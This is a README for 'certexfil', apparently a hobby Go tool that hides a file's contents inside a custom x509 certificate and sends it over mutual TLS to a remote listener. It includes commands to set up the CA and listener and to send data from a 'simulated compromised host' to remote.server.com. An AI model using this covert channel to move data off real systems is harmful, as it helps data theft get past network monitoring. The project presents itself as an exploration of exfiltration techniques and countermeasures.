# X509 Digital Certificate Exfiltration Exploration

## Overview

This project represents my initial venture into the Go programming language, focusing on data exfiltration techniques and their countermeasures. The primary goal is to develop a fun way to hide data by encoding a payload into a custom x509 digital certificate by reading from a file.

For an in-depth discussion on the topic, refer to my Medium article: [Abusing Certificates for Data Exfiltration](https://medium.com/@jeanmichel.amblat/abusing-certificates-for-data-exfiltration-d6bff2533cd0).

For those unfamiliar with the concepts of certificates and mutual TLS (mTLS), I recommend the following resources for a thorough understanding:

* [TLS, X509, and Mutual Authentication Explained](https://medium.com/sitewards/the-magic-of-tls-x509-and-mutual-authentication-explained-b2162dec4401)
* [A Step-by-Step Guide to mTLS in Go](https://venilnoronha.io/a-step-by-step-guide-to-mtls-in-go)

Certexfil operates in three modes: CA generation, client, and listener.

* `--ca` initializes a CA for certificate creation and authentication.
* `--payload` incorporates a file payload into a new client certificate for mTLS with a listener service.
* `--listen` launches a service that validates mTLS clients and extracts embedded payloads.

## Usage

### Setting Up CA and Listener on a Remote Server

To create `server_cert.pem` and `server_key.pem` for mTLS:

```shell
somewhere$ certexfil -ca -ecdsa-curve P521 --host remote.host.com
```

Ensure the certexfil binary and ./CERTS directory are on your remote server. Then, initiate the mTLS listener:
```shell
remoteserver$ ./certexfil --listen
```

### Client or Simulated Compromised Host
Embedding output as a payload:

```shell
06:46:00 jma@wintermute Go-Workspace → echo 'w00t w00t' | certexfil --host remote.server.com  --payload -
2019/05/31 18:48:27 [*] Reading from stdin..
2019/05/31 18:48:27 [D] Payload (raw)  --> w00t w00t...	(9 bytes)
2019/05/31 18:48:27 [D] Payload (Prepare()) --> �...		(31 bytes)
2019/05/31 18:48:27 [*] Generated custom cert with payload
Oo
```

## Contact

* @Sourcefrenchy
